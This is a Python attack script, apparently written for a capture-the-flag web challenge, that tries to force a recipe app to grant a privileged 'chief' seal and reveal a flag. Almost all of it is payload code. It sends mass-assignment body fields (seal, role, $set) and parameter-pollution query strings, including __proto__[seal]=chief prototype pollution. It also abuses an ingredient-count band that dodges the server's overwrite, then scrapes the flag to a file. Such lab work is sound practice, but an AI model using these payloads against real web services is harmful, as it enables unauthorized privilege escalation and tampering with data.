#!/usr/bin/env python3
"""Does the SUBMIT route write the seal field? My earlier test could not see it.

`qmark.py` put `?seal=chief` on POST /api/recipe and on /submit and then read the Seal
column after the batch settled - which showed `standard` no matter what, because the
inspector's stamp rewrites `seal` a few seconds later. So a real write at submit time is
invisible in that design: the oracle ran after the thing that overwrites the answer.

A batch in the jam band (138..141 max-length ingredients) is never stamped at all, so
whatever the submit route writes to `seal` stays there and is rendered verbatim. Same
trick applied to the create route: create in-band, then write with every parameter
channel the handler might merge (body keys, query string in both qs syntaxes, path
- Level, and `X-HTTP-Method-Override`-style verbs), and read /recipe/<id> for the golden
block. `seal: chief` is the whole game, and this is the one place it can be written by us.
"""
import re, sys, time
sys.path.insert(0, '.')
from cc import Client, new_baker

VAL = "x" * 64
NAME = lambda i: ("n%03d" % i).ljust(48, "z")
BAND = 140


def w(*a):
    sys.stdout.buffer.write((" ".join(str(x) for x in a) + "\n").encode("utf-8", "replace")); sys.stdout.flush()


def cell(c, rid):
    code, d, dt = c.get("/dashboard")
    blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % rid, d or "", re.S)
    if not blk:
        return "?"
    tail = " ".join(re.sub(r"<[^>]+>", " ", blk.group(0).split("</span>")[-1]).split())
    return "NONE" if "&mdash;" in tail else ("standard" if "standard" in tail else tail[:26])


def golden(c, rid):
    code, page, dt = c.get("/recipe/%s" % rid)
    page = str(page)
    g = re.search(r'class="seal gold"[\s\S]{0,600}?class="flag"[^>]*>\s*([^<]+)', page)
    if g:
        open("../flag.txt", "w", encoding="utf-8").write(g.group(1).strip() + "\n")
        w("      ############ GOLDEN: %s" % g.group(1).strip())
        return True
    if 'class="seal gold"' in page or 'class="flag"' in page:
        open("../files/golden_block_%s.html" % rid[:8], "w", encoding="utf-8").write(page)
        w("      !!! golden block present without a flag match (saved)")
        return True
    return False


BODY_CASES = [
    ("none", {}),
    ("body seal=chief", {"seal": "chief"}),
    ("body seal+status", {"seal": "chief", "status": "reviewed"}),
    ("body level=chief", {"level": "chief"}),
    ("body role=chief", {"role": "chief"}),
    ("body golden=true", {"golden": True, "seal": "chief"}),
    ("body $set", {"$set": {"seal": "chief"}}),
    ("body review_level", {"review_level": "chief", "sealLevel": "chief"}),
    ("body verdict", {"verdict": "chief", "stamp": "chief", "authority": "chief"}),
]
QUERY_CASES = [
    ("", None),
    ("?seal=chief", "seal=chief"),
    ("?seal=chief&status=reviewed", "seal=chief&status=reviewed"),
    ("?seal[seal]=chief", "seal[seal]=chief"),
    ("?__proto__[seal]=chief", "__proto__[seal]=chief"),
    ("?level=chief&seal=chief", "level=chief&seal=chief"),
    ("?role=chief", "role=chief"),
    ("?chief=1", "chief=1"),
]

u, c, _ = new_baker("sw2")
w("user %s   band=%d ingredients (%d B of cookies)" % (u, BAND, BAND * 115))
for label, body in BODY_CASES:
    code, out, dt = c.post("/api/recipe", {"title": label, "ingredients": [{"name": NAME(i), "value": VAL} for i in range(BAND)]})
    rid = out.get("id")
    if not rid:
        w("  create failed %s %s" % (code, str(out)[:60])); continue
    # submit carrying the write attempt
    code2, out2, dt = c.post("/api/recipe/%s/submit" % rid, body)
    w("  %-22s submit -> %s %s" % (label, code2, str(out2)[:44]))
    for k in range(10):
        time.sleep(5)
        if cell(c, rid) != "?":
            break
    seal = cell(c, rid)
    w("      band seal=%s  status=%s" % (seal, "reviewed" if seal in ("NONE", "standard") else "?"))
    if golden(c, rid) or seal not in ("NONE", "standard", "?"):
        w("      !!! submit body wrote something: seal=%r" % seal)
    time.sleep(0.3)

w("=== query string on submit (batch created in-band, body clean) ===")
for label, q in QUERY_CASES:
    code, out, dt = c.post("/api/recipe", {"title": "q " + label, "ingredients": [{"name": NAME(i), "value": VAL} for i in range(BAND)]})
    rid = out.get("id")
    if not rid:
        continue
    code2, out2, dt = c.post("/api/recipe/%s/submit%s" % (rid, q or ""), {})
    for k in range(10):
        time.sleep(5)
        if cell(c, rid) != "?":
            break
    seal = cell(c, rid)
    w("  %-26s submit %s seal=%-9s" % (label, code2, seal))
    golden(c, rid)

w("=== write at CREATE time and never submit (unstampable seal survives) ===")
for f in ("seal", "level", "verdict", "stamp", "grade", "tier", "authority", "review_level", "role"):
    code, out, dt = c.post("/api/recipe", {"title": "c " + f, f: "chief",
                                          "ingredients": [{"name": "flour", "value": "1"}]})
    rid = out.get("id")
    if rid:
        c.post("/api/recipe/%s/submit" % rid, {})
        time.sleep(12)
        s = cell(c, rid)
        w("  create %s=chief -> after submit seal=%r (must become 'standard' if writes are ignored)" % (f, s))
        golden(c, rid)
w("done")
